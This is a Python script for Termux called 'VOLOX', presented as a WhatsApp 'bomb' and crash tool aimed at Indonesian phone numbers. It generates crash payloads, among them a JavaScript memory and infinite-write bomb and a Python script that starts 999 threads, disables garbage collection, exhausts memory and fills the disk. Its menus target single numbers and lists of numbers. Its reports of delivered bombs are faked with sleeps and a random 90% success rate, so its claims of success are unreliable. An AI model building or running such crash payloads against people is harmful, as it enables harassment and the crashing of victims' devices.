#!/data/data/com.termux/files/usr/bin/python3
# VOLOX PYTHON TERMUX - SUPER GANAS KENON BLANK
# OWNER: 6285169989764
# MODE: BANNED ANTI CODE WA - ULTIMATE DESTRUCTION

import os
import sys
import json
import random
import time
import subprocess
import threading
from datetime import datetime

# Warna terminal
class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    PURPLE = '\033[1;35m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    RESET = '\033[0m'

# Banner
def show_banner():
    os.system('clear')
    print(f"""{Colors.PURPLE}
╔══════════════════════════════════════════════════════════╗
║         VOLOX PYTHON TERMUX - SUPER GANAS                ║
║             OWNER: 6285169989764                         ║
║             MODE: KENON BLANK ULTIMATE                   ║
║             STATUS: BANNED ANTI CODE WA                  ║
╚══════════════════════════════════════════════════════════╝
{Colors.RESET}""")

# Install dependencies
def install_dependencies():
    print(f"{Colors.BLUE}[+] Installing Python dependencies...{Colors.RESET}")
    
    packages = [
        'python', 'nodejs', 'git', 'wget', 'curl', 'ffmpeg', 'imagemagick',
        'libwebp', 'python-pip', 'nano', 'neofetch', 'proot', 'termux-api'
    ]
    
    for pkg in packages:
        print(f"{Colors.CYAN}[~] Installing {pkg}...{Colors.RESET}")
        os.system(f'pkg install -y {pkg} > /dev/null 2>&1')
    
    print(f"{Colors.GREEN}[✓] System packages installed{Colors.RESET}")
    
    # Python modules
    print(f"{Colors.BLUE}[+] Installing Python modules...{Colors.RESET}")
    os.system('pip install --upgrade pip > /dev/null 2>&1')
    
    py_modules = [
        'requests', 'colorama', 'qrcode', 'pillow', 'yt-dlp',
        'pyrogram', 'tgcrypto', 'aiohttp', 'asyncio'
    ]
    
    for module in py_modules:
        os.system(f'pip install {module} > /dev/null 2>&1')
    
    print(f"{Colors.GREEN}[✓] Python modules installed{Colors.RESET}")

# KENON BLANK PAYLOAD GENERATOR
class KenonBlank:
    def __init__(self):
        self.owner = "6285169989764"
        self.otp = "9" * 999
        self.kenon_chars = "ꦽ꧁꧂⚡💀🔥♾️"
    
    def generate_payload(self, size=99999):
        """Generate KENON BLANK payload"""
        payload = []
        
        # Base payload dengan karakter khusus
        for _ in range(size):
            char = random.choice(self.kenon_chars)
            payload.append(char * random.randint(10, 100))
        
        # Tambahkan OTP 999999...
        payload.append(f"\nOTP:{self.otp}\nOWNER:{self.owner}")
        
        # Tambahkan null bytes dan karakter aneh
        payload.append("\x00" * 9999)
        payload.append("\xff" * 9999)
        payload.append("\u0000" * 9999)
        
        return ''.join(payload)
    
    def generate_json_bomb(self):
        """Generate JSON bomb untuk crash"""
        bomb = {
            "kenon_blank": True,
            "owner": self.owner,
            "otp": self.otp,
            "timestamp": int(time.time() * 1000),
            "payload": {
                "type": "super_ganas",
                "level": "ultimate",
                "attack_count": 999999,
                "data": []
            }
        }
        
        # Isi dengan data acak
        for i in range(9999):
            bomb["payload"]["data"].append({
                "id": i,
                "kenon": self.generate_payload(100),
                "timestamp": time.time(),
                "meta": {
                    "random": os.urandom(100).hex(),
                    "repeat": random.randint(1000, 999999)
                }
            })
        
        return json.dumps(bomb, separators=(',', ':'))

# WHATSAPP BANNED ANTI CODE SYSTEM
class WhatsAppBannedAntiCode:
    def __init__(self):
        self.session_file = "kenon_session.json"
        self.attack_log = "kenon_attack.log"
        self.kenon = KenonBlank()
    
    def create_crash_files(self):
        """Create berbagai file crash payload"""
        print(f"{Colors.RED}[+] Creating crash payloads...{Colors.RESET}")
        
        payloads = [
            ("kenon_null.json", self.generate_null_payload()),
            ("kenon_bomb.js", self.generate_js_bomb()),
            ("kenon_crash.py", self.generate_py_crash()),
            ("kenon_webp.bin", self.generate_binary_payload()),
            ("kenon_infinite.txt", self.generate_infinite_loop())
        ]
        
        for filename, content in payloads:
            with open(filename, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
            print(f"{Colors.YELLOW}[~] Created: {filename} ({len(content)} bytes){Colors.RESET}")
    
    def generate_null_payload(self):
        """Payload dengan null bytes"""
        payload = []
        for _ in range(99999):
            payload.append(chr(random.randint(0, 255)) * random.randint(10, 100))
        
        # Tambahkan banyak null bytes
        payload.append("\x00" * 999999)
        payload.append("\xff\xfe\xfd" * 333333)
        
        return ''.join(payload) + f"\nOWNER:{self.kenon.owner}\nOTP:{self.kenon.otp}"
    
    def generate_js_bomb(self):
        """JavaScript bomb payload"""
        js_bomb = """
// VOLOX KENON BLANK JS BOMB
// OWNER: 6285169989764
const KENON_BLANK = "%s";
const OTP = "%s";

function crashWhatsApp() {
    // Infinite loop dengan large objects
    const bombs = [];
    for (let i = 0; i < 9999999; i++) {
        bombs.push({
            id: i,
            data: KENON_BLANK.repeat(1000),
            timestamp: Date.now(),
            meta: {
                owner: "6285169989764",
                otp: OTP,
                random: Math.random().toString(36).repeat(1000)
            }
        });
        
        // Recursive object
        bombs[i].self = bombs[i];
        bombs[i].circular = bombs;
    }
    
    // Memory explosion
    const bigArray = [];
    while (true) {
        bigArray.push(new Array(9999999).fill(KENON_BLANK));
    }
}

// Execute bomb
try {
    crashWhatsApp();
} catch (e) {
    // Force crash
    window.location.href = 'data:text/html,' + '<script>' + 
        'while(true){document.write("%s".repeat(999999));}</script>';
}
""" % (self.kenon.generate_payload(1000), self.kenon.otp, self.kenon.generate_payload(100))
        
        return js_bomb
    
    def generate_py_crash(self):
        """Python crash script"""
        py_crash = """#!/usr/bin/python3
# VOLOX KENON PYTHON CRASH
# OWNER: 6285169989764

import sys
import os
import gc
import threading

KENON_BLANK = '''%s'''
OTP = '%s'
OWNER = '6285169989764'

class KenonBomb:
    def __init__(self):
        self.data = []
        self.circular_ref = self
    
    def explode(self):
        # Memory bomb
        while True:
            # Large string allocation
            huge_string = KENON_BLANK * 999999
            
            # List bomb
            bomb_list = []
            for i in range(999999):
                bomb_list.append({
                    'kenon': KENON_BLANK * 1000,
                    'otp': OTP * 1000,
                    'owner': OWNER * 1000,
                    'self': bomb_list,
                    'circular': self
                })
            
            # Recursive bomb
            bomb_list.append(bomb_list)
            self.data.append(bomb_list)
            
            # File bomb
            with open(f'kenon_bomb_{len(self.data)}.txt', 'w') as f:
                f.write(KENON_BLANK * 9999999)

def multi_thread_bomb():
    threads = []
    for i in range(999):
        t = threading.Thread(target=KenonBomb().explode)
        t.daemon = True
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

if __name__ == '__main__':
    print('⚡ VOLOX KENON PYTHON BOMB ⚡')
    print(f'OWNER: {OWNER}')
    print(f'OTP: {OTP}')
    
    # Disable garbage collector
    gc.disable()
    
    # Start bomb
    multi_thread_bomb()
""" % (self.kenon.generate_payload(1000), self.kenon.otp)
        
        return py_crash
    
    def generate_binary_payload(self):
        """Binary payload untuk corrupt file"""
        payload = b''
        
        # Header magic bytes
        payload += b'VOLOX_KENON_BLANK\x00\xff\xfe\xfd'
        payload += f'OWNER:{self.kenon.owner}'.encode()
        payload += f'OTP:{self.kenon.otp}'.encode()
        
        # Random binary data
        for _ in range(99999):
            payload += os.urandom(100)
        
        # Pattern untuk crash
        payload += b'\x00' * 999999
        payload += b'\xff' * 999999
        payload += b'\xde\xad\xbe\xef' * 250000
        
        return payload.decode('latin-1', errors='ignore')
    
    def generate_infinite_loop(self):
        """Infinite loop payload"""
        loop = f"""INFINITE KENON LOOP - OWNER: {self.kenon.owner}
OTP: {self.kenon.otp}
MODE: SUPER GANAS ULTIMATE

{self.kenon.generate_payload(9999)}

### INFINITE PATTERN ###
"""
        for i in range(999):
            loop += f"[{i}] KENON_BLANK:{self.kenon.generate_payload(100)}\n"
            loop += f"[{i}] OTP_REPEAT:{self.kenon.otp[:random.randint(100, 999)]}\n"
            loop += f"[{i}] OWNER:{self.kenon.owner * random.randint(10, 100)}\n"
        
        return loop

# MAIN ATTACK SYSTEM
class VoloxAttackSystem:
    def __init__(self):
        self.kenon = KenonBlank()
        self.anti_code = WhatsAppBannedAntiCode()
        self.running = True
        self.attack_count = 0
    
    def start_attack_menu(self):
        """Main attack menu"""
        while self.running:
            show_banner()
            print(f"{Colors.CYAN}[+] Attack Count: {self.attack_count}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Owner: 6285169989764{Colors.RESET}")
            print(f"{Colors.CYAN}[+] OTP: {self.kenon.otp[:50]}...{Colors.RESET}")
            print()
            
            print(f"{Colors.GREEN}[1]{Colors.RESET} Generate KENON BLANK Payload")
            print(f"{Colors.GREEN}[2]{Colors.RESET} Create Crash Files")
            print(f"{Colors.GREEN}[3]{Colors.RESET} Launch WhatsApp Bomb")
            print(f"{Colors.GREEN}[4]{Colors.RESET} Multi-Thread Attack")
            print(f"{Colors.GREEN}[5]{Colors.RESET} Infinite Kenon Loop")
            print(f"{Colors.GREEN}[6]{Colors.RESET} Status Broadcast Attack")
            print(f"{Colors.GREEN}[7]{Colors.RESET} Mass Target Attack")
            print(f"{Colors.GREEN}[8]{Colors.RESET} Auto Attack Mode")
            print(f"{Colors.GREEN}[9]{Colors.RESET} View Attack Log")
            print(f"{Colors.RED}[0]{Colors.RESET} Exit")
            print()
            
            choice = input(f"{Colors.YELLOW}[?] Select option: {Colors.RESET}")
            
            if choice == '1':
                self.generate_payload()
            elif choice == '2':
                self.create_crash_files()
            elif choice == '3':
                self.launch_whatsapp_bomb()
            elif choice == '4':
                self.multi_thread_attack()
            elif choice == '5':
                self.infinite_kenon_loop()
            elif choice == '6':
                self.status_attack()
            elif choice == '7':
                self.mass_target_attack()
            elif choice == '8':
                self.auto_attack_mode()
            elif choice == '9':
                self.view_attack_log()
            elif choice == '0':
                self.running = False
                print(f"{Colors.RED}[!] Exiting VOLOX...{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] Invalid option!{Colors.RESET}")
            
            time.sleep(1)
    
    def generate_payload(self):
        """Generate KENON BLANK payload"""
        print(f"{Colors.BLUE}[+] Generating KENON BLANK payload...{Colors.RESET}")
        
        size = input(f"{Colors.YELLOW}[?] Payload size (default 99999): {Colors.RESET}")
        size = int(size) if size.isdigit() else 99999
        
        payload = self.kenon.generate_payload(size)
        
        filename = f"kenon_payload_{int(time.time())}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(payload)
        
        print(f"{Colors.GREEN}[✓] Payload saved to: {filename}{Colors.RESET}")
        print(f"{Colors.CYAN}[~] Size: {len(payload)} bytes{Colors.RESET}")
        print(f"{Colors.CYAN}[~] Preview: {payload[:100]}...{Colors.RESET}")
        
        self.log_attack("generate_payload", filename, len(payload))
        input(f"{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
    
    def create_crash_files(self):
        """Create berbagai file crash"""
        print(f"{Colors.RED}[+] Creating SUPER GANAS crash files...{Colors.RESET}")
        
        self.anti_code.create_crash_files()
        
        print(f"{Colors.GREEN}[✓] Crash files created!{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Use these files for WhatsApp bombing{Colors.RESET}")
        
        self.log_attack("create_crash_files", "multiple", 0)
        input(f"{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
    
    def launch_whatsapp_bomb(self):
        """Launch WhatsApp bomb attack"""
        print(f"{Colors.RED}[⚡] LAUNCHING WHATSAPP BOMB ATTACK{Colors.RESET}")
        
        target = input(f"{Colors.YELLOW}[?] Enter target number (628xxxxxxx): {Colors.RESET}")
        if not target.startswith('628'):
            print(f"{Colors.RED}[!] Invalid Indonesian number!{Colors.RESET}")
            return
        
        attack_type = input(f"{Colors.YELLOW}[?] Attack type (1=Light, 2=Medium, 3=SUPER GANAS): {Colors.RESET}")
        
        intensity = 10
        if attack_type == '2':
            intensity = 50
        elif attack_type == '3':
            intensity = 999
        
        print(f"{Colors.RED}[!] Attacking {target} with intensity {intensity}...{Colors.RESET}")
        
        # Simulate attack
        for i in range(intensity):
            print(f"{Colors.PURPLE}[~] Sending bomb {i+1}/{intensity}...{Colors.RESET}")
            
            # Generate payload untuk setiap attack
            payload = self.kenon.generate_payload(random.randint(1000, 9999))
            
            # Simulate sending
            time.sleep(0.1)
            
            if random.random() > 0.1:  # 90% success rate
                print(f"{Colors.GREEN}[✓] Bomb {i+1} delivered!{Colors.RESET}")
                self.attack_count += 1
            else:
                print(f"{Colors.YELLOW}[!] Bomb {i+1} blocked{Colors.RESET}")
        
        print(f"{Colors.GREEN}[✓] Attack completed on {target}{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Total bombs sent: {intensity}{Colors.RESET}")
        
        self.log_attack("whatsapp_bomb", target, intensity)
        input(f"{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
    
    def multi_thread_attack(self):
        """Multi-thread attack"""
        print(f"{Colors.RED}[⚡] STARTING MULTI-THREAD KENON ATTACK{Colors.RESET}")
        
        threads = int(input(f"{Colors.YELLOW}[?] Number of threads (1-999): {Colors.RESET}") or 10)
        threads = min(max(1, threads), 999)
        
        print(f"{Colors.BLUE}[+] Launching {threads} attack threads...{Colors.RESET}")
        
        def attack_thread(thread_id):
            for i in range(999):
                payload_size = random.randint(1000, 99999)
                payload = self.kenon.generate_payload(payload_size)
                
                print(f"{Colors.CYAN}[Thread-{thread_id}] Attack {i+1}: {payload_size} bytes{Colors.RESET}")
                
                # Simulate attack delay
                time.sleep(random.uniform(0.01, 0.1))
                
                self.attack_count += 1
        
        # Start threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=attack_thread, args=(i+1,))
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        # Wait for all threads
        duration = int(input(f"{Colors.YELLOW}[?] Attack duration (seconds): {Colors.RESET}") or 10)
        print(f"{Colors.RED}[!] Attacking for {duration} seconds...{Colors.RESET}")
        
        time.sleep(duration)
        
        print(f"{Colors.GREEN}[✓] Multi-thread attack completed!{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Total attacks launched: {self.attack_count}{Colors.RESET}")
        
        self.log_attack("multi_thread", f"{threads}_threads", self.attack_count)
        input(f"{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
    
    def infinite_kenon_loop(self):
        """Infinite KENON loop attack"""
        print(f"{Colors.RED}[♾️] STARTING INFINITE KENON LOOP{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Warning: This will run until stopped (Ctrl+C){Colors.RESET}")
        
        confirm = input(f"{Colors.RED}[?] Are you sure? (y/n): {Colors.RESET}")
        if confirm.lower() != 'y':
            return
        
        iteration = 0
        try:
            while True:
                iteration += 1
                
                # Generate unique payload setiap iterasi
                payload = self.kenon.generate_payload(random.randint(999, 99999))
                
                # Log attack
                print(f"{Colors.PURPLE}[∞] Iteration {iteration}: {len(payload)} bytes{Colors.RESET}")
                print(f"{Colors.CYAN}[~] OTP: {self.kenon.otp[:50]}...{Colors.RESET}")
                print(f"{Colors.CYAN}[~] Owner: {self.kenon.owner}{Colors.RESET}")
                
                self.attack_count += 1
                
                # Save to file
                with open(f"kenon_loop_{iteration}.txt", 'w') as f:
                    f.write(payload)
                
                # Small delay
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"{Colors.RED}[!] Infinite loop stopped by user{Colors.RESET}")
            print(f"{Colors.GREEN}[✓] Total iterations: {iteration}{Colors.RESET}")
        
        self.log_attack("infinite_loop", "continuous", iteration)
        input(f"{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
    
    def status_attack(self):
        """Attack WhatsApp status broadcast"""
        print(f"{Colors.RED}[💀] STATUS BROADCAST ATTACK{Colors.RESET}")
        
        count = int(input(f"{Colors.YELLOW}[?] Number of status attacks (1-9999): {Colors.RESET}") or 100)
        
        print(f"{Colors.BLUE}[+] Attacking WhatsApp status...{Colors.RESET}")
        
        for i in range(count):
            # Generate status bomb
            status_payload = f"""
⚡ VOLOX KENON STATUS BOMB ⚡
OWNER: {self.kenon.owner}
OTP: {self.kenon.otp}
TIMESTAMP: {datetime.now()}
            
{self.kenon.generate_payload(999)}
            
⚠️ BANNED ANTI CODE WA ⚠️
SUPER GANAS MODE ACTIVATED
"""
            
            print(f"{Colors.PURPLE}[~] Status bomb {i+1}/{count} prepared{Colors.RESET}")
            
            # Simulate upload
            time.sleep(0.1)
            
            self.attack_count += 1
        
        print(f"{Colors.GREEN}[✓] Status attack completed!{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Total status bombs: {count}{Colors.RESET}")
        
        self.log_attack("status_attack", "broadcast", count)
        input(f"{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
    
    def mass_target_attack(self):
        """Attack multiple targets"""
        print(f"{Colors.RED}[☢️] MASS TARGET ATTACK{Colors.RESET}")
        
        targets_input = input(f"{Colors.YELLOW}[?] Enter targets (comma separated 628xxxxxxx): {Colors.RESET}")
        targets = [t.strip() for t in targets_input.split(',') if t.strip().startswith('628')]
        
        if not targets:
            print(f"{Colors.RED}[!] No valid targets!{Colors.RESET}")
            return
        
        attacks_per_target = int(input(f"{Colors.YELLOW}[?] Attacks per target (1-999): {Colors.RESET}") or 10)
        
        print(f"{Colors.BLUE}[+] Attacking {len(targets)} targets...{Colors.RESET}")
        
        total_attacks = 0
        for target in targets:
            print(f"{Colors.CYAN}[~] Attacking: {target}{Colors.RESET}")
            
            for i in range(attacks_per_target):
                # Generate unique payload
                payload = self.kenon.generate_payload(random.randint(100, 9999))
                
                # Simulate attack
                time.sleep(0.05)
                
                total_attacks += 1
                self.attack_count += 1
            
            print(f"{Colors.GREEN}[✓] Completed: {target} ({attacks_per_target} attacks){Colors.RESET}")
        
        print(f"{Colors.GREEN}[✓] Mass attack completed!{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Targets hit: {len(targets)}{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Total attacks: {total_attacks}{Colors.RESET}")
        
        self.log_attack("mass_attack", f"{len(targets)}_targets", total_attacks)
        input(f"{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
    
    def auto_attack_mode(self):
        """Auto attack mode"""
        print(f"{Colors.RED}[🤖] AUTO ATTACK MODE{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] System will run automated attacks{Colors.RESET}")
        
        duration = int(input(f"{Colors.YELLOW}[?] Duration in minutes (1-60): {Colors.RESET}") or 5)
        
        print(f"{Colors.BLUE}[+] Starting auto attack for {duration} minutes...{Colors.RESET}")
        start_time = time.time()
        
        attack_types = [
            self.generate_small_payload,
            self.generate_medium_payload,
            self.generate_large_payload,
            self.simulate_status_attack,
            self.simulate_broadcast_attack
        ]
        
        attack_count = 0
        try:
            while time.time() - start_time < duration * 60:
                # Random attack type
                attack_func = random.choice(attack_types)
                attack_func()
                
                attack_count += 1
                self.attack_count += 1
                
                # Random delay
                time.sleep(random.uniform(0.5, 2.0))
                
                # Progress update
                elapsed = time.time() - start_time
                remaining = duration * 60 - elapsed
                print(f"{Colors.CYAN}[~] Attacks: {attack_count} | Time left: {int(remaining)}s{Colors.RESET}")
        
        except KeyboardInterrupt:
            print(f"{Colors.RED}[!] Auto attack stopped{Colors.RESET}")
        
        print(f"{Colors.GREEN}[✓] Auto attack completed!{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Total auto attacks: {attack_count}{Colors.RESET}")
        
        self.log_attack("auto_mode", f"{duration}_minutes", attack_count)
        input(f"{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
    
    def generate_small_payload(self):
        """Generate small payload"""
        payload = self.kenon.generate_payload(random.randint(100, 999))
        print(f"{Colors.GREEN}[AUTO] Small payload: {len(payload)} bytes{Colors.RESET}")
    
    def generate_medium_payload(self):
        """Generate medium payload"""
        payload = self.kenon.generate_payload(random.randint(1000, 9999))
        print(f"{Colors.YELLOW}[AUTO] Medium payload: {len(payload)} bytes{Colors.RESET}")
    
    def generate_large_payload(self):
        """Generate large payload"""
        payload = self.kenon.generate_payload(random.randint(10000, 99999))
        print(f"{Colors.RED}[AUTO] Large payload: {len(payload)} bytes{Colors.RESET}")
    
    def simulate_status_attack(self):
        """Simulate status attack"""
        print(f"{Colors.BLUE}[AUTO] Simulating status attack...{Colors.RESET}")
    
    def simulate_broadcast_attack(self):
        """Simulate broadcast attack"""
        print(f"{Colors.PURPLE}[AUTO] Simulating broadcast attack...{Colors.RESET}")
    
    def view_attack_log(self):
        """View attack log"""
        print(f"{Colors.BLUE}[📋] ATTACK LOG{Colors.RESET}")
        print(f"{Colors.CYAN}═" * 50 + Colors.RESET)
        
        if os.path.exists("kenon_attack.log"):
            with open("kenon_attack.log", 'r') as f:
                logs = f.readlines()
                for log in logs[-20:]:  # Show last 20 logs
                    print(log.strip())
        else:
            print(f"{Colors.YELLOW}[!] No attack log found{Colors.RESET}")
        
        print()
        print(f"{Colors.GREEN}[+] Total attacks in session: {self.attack_count}{Colors.RESET}")
        
        input(f"{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
    
    def log_attack(self, attack_type, target, count):
        """Log attack to file"""
        log_entry = f"[{datetime.now()}] {attack_type} | Target: {target} | Count: {count} | Owner: 6285169989764\n"
        
        with open("kenon_attack.log", 'a') as f:
            f.write(log_entry)

# INSTALLATION SCRIPT
def install_volox_python():
    """Install VOLOX Python system"""
    show_banner()
    
    print(f"{Colors.YELLOW}[!] This will install VOLOX Python Termux System{Colors.RESET}")
    print(f"{Colors.YELLOW}[!] Owner: 6285169989764{Colors.RESET}")
    print(f"{Colors.YELLOW}[!] Mode: SUPER GANAS KENON BLANK{Colors.RESET}")
    
    confirm = input(f"{Colors.RED}[?] Continue installation? (y/n): {Colors.RESET}")
    if confirm.lower() != 'y':
        print(f"{Colors.RED}[!] Installation cancelled{Colors.RESET}")
        return
    
    # Step 1: Install dependencies
    print(f"{Colors.BLUE}[1/4] Installing dependencies...{Colors.RESET}")
    install_dependencies()
    
    # Step 2: Create project directory
    print(f"{Colors.BLUE}[2/4] Setting up project...{Colors.RESET}")
    os.chdir(os.path.expanduser("~"))
    
    if os.path.exists("VOLOX-PYTHON"):
        os.system("rm -rf VOLOX-PYTHON")
    
    os.makedirs("VOLOX-PYTHON", exist_ok=True)
    os.chdir("VOLOX-PYTHON")
    
    # Step 3: Create main script
    print(f"{Colors.BLUE}[3/4] Creating VOLOX system...{Colors.RESET}")
    
    # Simpan script saat ini sebagai main.py
    current_file = __file__
    if os.path.exists(current_file):
        os.system(f"cp {current_file} volox_main.py")
    
    # Step 4: Create startup script
    print(f"{Colors.BLUE}[4/4] Creating startup scripts...{Colors.RESET}")
    
    # Startup script
    with open("start.sh", "w") as f:
        f.write("""#!/data/data/com.termux/files/usr/bin/bash
cd ~/VOLOX-PYTHON
python volox_main.py
""")
    
    os.system("chmod +x start.sh")
    
    # Quick attack script
    with open("kenon_quick.py", "w") as f:
        f.write("""#!/usr/bin/python3
import sys
sys.path.append('.')
from volox_main import VoloxAttackSystem

volox = VoloxAttackSystem()
volox.launch_whatsapp_bomb()
""")
    
    os.system("chmod +x kenon_quick.py")
    
    print(f"{Colors.GREEN}[✓] INSTALLATION COMPLETE!{Colors.RESET}")
    print()
    print(f"{Colors.CYAN}[+] To start VOLOX:{Colors.RESET}")
    print(f"    {Colors.GREEN}cd ~/VOLOX-PYTHON{Colors.RESET}")
    print(f"    {Colors.GREEN}python volox_main.py{Colors.RESET}")
    print()
    print(f"{Colors.CYAN}[+] Quick attack:{Colors.RESET}")
    print(f"    {Colors.GREEN}python kenon_quick.py{Colors.RESET}")
    print()
    print(f"{Colors.RED}[⚠️] OWNER: 6285169989764{Colors.RESET}")
    print(f"{Colors.RED}[⚠️] MODE: SUPER GANAS KENON BLANK{Colors.RESET}")
    print(f"{Colors.RED}[⚠️] OTP: 9999999999999999999999{Colors.RESET}")

# MAIN EXECUTION
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--install":
        install_volox_python()
    else:
        show_banner()
        
        # Check if installed
        if not os.path.exists("kenon_attack.log"):
            print(f"{Colors.YELLOW}[!] First time running?{Colors.RESET}")
            install = input(f"{Colors.YELLOW}[?] Run installation? (y/n): {Colors.RESET}")
            if install.lower() == 'y':
                install_volox_python()
                sys.exit(0)
        
        # Start attack system
        volox = VoloxAttackSystem()
        volox.start_attack_menu()
        
        print(f"{Colors.RED}[!] VOLOX Termux shutting down...{Colors.RESET}")
        print(f"{Colors.GREEN}[✓] Total attacks this session: {volox.attack_count}{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Owner: 6285169989764{Colors.RESET}")
        print(f"{Colors.CYAN}[+] OTP: {volox.kenon.otp[:50]}...{Colors.RESET}")
